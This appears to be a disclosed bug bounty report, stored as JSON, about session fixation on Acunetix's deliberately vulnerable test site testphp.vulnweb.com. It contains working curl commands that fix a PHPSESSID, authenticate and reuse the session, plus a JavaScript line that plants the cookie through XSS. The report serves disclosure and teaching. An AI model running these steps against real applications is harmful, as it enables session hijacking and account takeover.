{
  "id": 800010,
  "title": "Session Fixation via Accepted Arbitrary PHPSESSID on testphp.vulnweb.com",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "visibility": "full",
  "team": {"handle": "acunetix-testphp", "name": "Acunetix Test PHP"},
  "reporter": {"username": "resurface_demo"},
  "weakness": {"id": 384, "name": "Session Fixation"},
  "vulnerability_information": "## Summary\nThe application at `http://testphp.vulnweb.com` accepts and uses arbitrary `PHPSESSID` values provided by the client without regenerating the session ID after authentication. This enables session fixation attacks where an attacker sets a known session ID for a victim, waits for the victim to authenticate, and then uses the same session ID to access the victim's authenticated session.\n\n## Steps to Reproduce\n\n### 1. Verify Session Acceptance\n```bash\n# Send a request with an attacker-chosen session ID\ncurl -sD - -b 'PHPSESSID=attacker_fixed_session_123' 'http://testphp.vulnweb.com/login.php' 2>&1 | grep -i cookie\n```\nThe server does NOT respond with a `Set-Cookie` header to override the session — it accepts the attacker-supplied value.\n\n### 2. Attack Scenario\n1. **Attacker** generates a session ID and sends a link to the victim:\n```\nhttp://testphp.vulnweb.com/login.php?PHPSESSID=attacker_controlled_session_id\n```\nOr sets the cookie via XSS on a related subdomain:\n```javascript\ndocument.cookie = 'PHPSESSID=attacker_controlled_session_id; path=/; domain=.vulnweb.com';\n```\n\n2. **Victim** clicks the link and logs in with their credentials.\n\n3. **Attacker** uses the same PHPSESSID to access the victim's authenticated session:\n```bash\ncurl -b 'PHPSESSID=attacker_controlled_session_id' 'http://testphp.vulnweb.com/userinfo.php'\n```\n\n### 3. Missing Session Regeneration\nThe application does not call `session_regenerate_id()` after successful login, so the pre-authentication session ID remains valid post-authentication.\n\n## Proof of Concept\n```bash\n# Step 1: Attacker sets a known session\ncurl -sD - -b 'PHPSESSID=fixedvalue123' 'http://testphp.vulnweb.com/login.php' 2>&1 | head -15\n# No Set-Cookie to override — session is accepted as-is\n\n# Step 2: Victim authenticates with the fixed session\ncurl -s -b 'PHPSESSID=fixedvalue123' -X POST 'http://testphp.vulnweb.com/userinfo.php' \\\n  -d 'uname=test&pass=test'\n\n# Step 3: Attacker uses the same session to access authenticated pages\ncurl -s -b 'PHPSESSID=fixedvalue123' 'http://testphp.vulnweb.com/userinfo.php'\n```\n\n## Impact\n- **Account takeover** — attacker gains full access to victim's authenticated session\n- **Sensitive data exposure** — credit card numbers, email addresses, phone numbers visible in user profile\n- **Privilege escalation** — if an admin authenticates with the fixed session, attacker gains admin access\n- Combined with the open redirect in `redir.php`, the attacker can make the fixation URL appear trustworthy",
  "disclosed_at": "2025-08-05T15:00:00.000Z",
  "bounty_amount": "1000.0"
}
